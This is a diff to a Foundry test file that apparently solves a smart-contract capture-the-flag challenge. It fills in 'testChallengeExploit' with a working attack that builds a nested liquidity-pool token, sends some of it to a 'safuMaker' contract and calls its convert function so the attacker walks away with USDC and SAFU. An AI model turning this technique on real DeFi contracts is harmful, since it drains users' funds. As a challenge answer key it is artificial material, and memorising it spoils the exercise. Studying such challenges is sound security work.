@@ -98,7 +98,79 @@ contract Testing is Test {
     function testChallengeExploit() public {
         vm.startPrank(attacker, attacker);
 
-        // implement solution here
+        // approve tokens for use
+        usdc.approve(address(safuRouter), type(uint256).max);
+        safu.approve(address(safuRouter), type(uint256).max);
+
+        // get LP of (USDC-SAFU)
+        safuRouter.addLiquidity({
+            tokenA: address(usdc),
+            tokenB: address(safu),
+            amountADesired: 10e18,
+            amountBDesired: 10e18,
+            amountAMin: 0,
+            amountBMin: 0,
+            to: attacker,
+            deadline: block.timestamp
+        });
+
+        // approve the LP of (USDC-SAFU) for use
+        safuPair.approve(address(safuRouter), type(uint256).max);
+
+        // create a new pool of LP(USDC-SAFU)-SAFU and get its LP
+        safuRouter.addLiquidity({
+            tokenA: address(safuPair),
+            tokenB: address(safu),
+            amountADesired: 10e18,
+            amountBDesired: 10e18,
+            amountAMin: 0,
+            amountBMin: 0,
+            to: attacker,
+            deadline: block.timestamp
+        });
+
+        // get the attackPair - LP(USDC-SAFU)-SAFU
+        IUniswapV2Pair attackPair = IUniswapV2Pair(safuFactory.getPair(address(safuPair), address(safu)));
+
+        // transfer a little LP of LP(USDC-SAFU)-SAFU to safuMaker
+        attackPair.transfer(address(safuMaker), 1e18);
+
+        console.log("BEFORE");
+        console.log("safuMaker safuPair LP  ", safuPair.balanceOf(address(safuMaker)));
+        console.log("safuMaker attackPair LP", attackPair.balanceOf(address(safuMaker)));
+
+        // convert LP(USDC-SAFU) and SAFU to SAFU -- the exploit
+        safuMaker.convert({token0: address(safuPair), token1: address(safu)});
+
+        console.log("AFTER");
+        console.log("safuMaker safuPair LP  ", safuPair.balanceOf(address(safuMaker)));
+        console.log("safuMaker attackPair LP", attackPair.balanceOf(address(safuMaker)));
+
+        // to bypass underflow when trying to removeLiquidity from attackPair
+        address[] memory _path = new address[](2);
+        _path[0] = address(safu);
+        _path[1] = address(safuPair);
+
+        safuRouter.swapExactTokensForTokens({
+            amountIn: 1e18,
+            amountOutMin: 0,
+            path: _path,
+            to: attacker,
+            deadline: block.timestamp
+        });
+
+        safuRouter.removeLiquidity({
+            tokenA: address(usdc),
+            tokenB: address(safu),
+            liquidity: safuPair.balanceOf(attacker),
+            amountAMin: 0,
+            amountBMin: 0,
+            to: attacker,
+            deadline: block.timestamp
+        });
+
+        console.log("attacker usdc", usdc.balanceOf(attacker));
+        console.log("attacker safu", safu.balanceOf(attacker));
 
         vm.stopPrank();
         validation();
